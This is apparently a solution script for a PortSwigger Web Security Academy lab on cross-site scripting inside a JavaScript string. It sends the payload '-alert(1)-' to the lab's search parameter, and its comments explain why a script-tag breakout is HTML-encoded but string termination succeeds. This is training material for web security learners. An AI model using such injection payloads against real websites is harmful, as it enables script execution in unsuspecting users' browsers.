# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ace31f521e9ebf25803d14fa007b0004.web-security-academy.net"
path = ""
url = scheme + host + path
# payload = "</script><script>alert(1)</script>"
payload = "'-alert(1)-'"
params = {"search": payload}

requests.get(url, params=params, proxies=proxies, verify=verify)

# Just sending the raw html means that the output gets html encoded. Therefore we cannot break out of the html context we are in.
# <script>
#     var searchTerms = '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>

# However we can break out of the javascript context we are in by prematurely terminating the string. The dashes are just
# weird javascript syntax. Don't worry about the specifics of it. Javascript is ugly
# <script>
#     var searchTerms = ''-alert(1)-'';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>
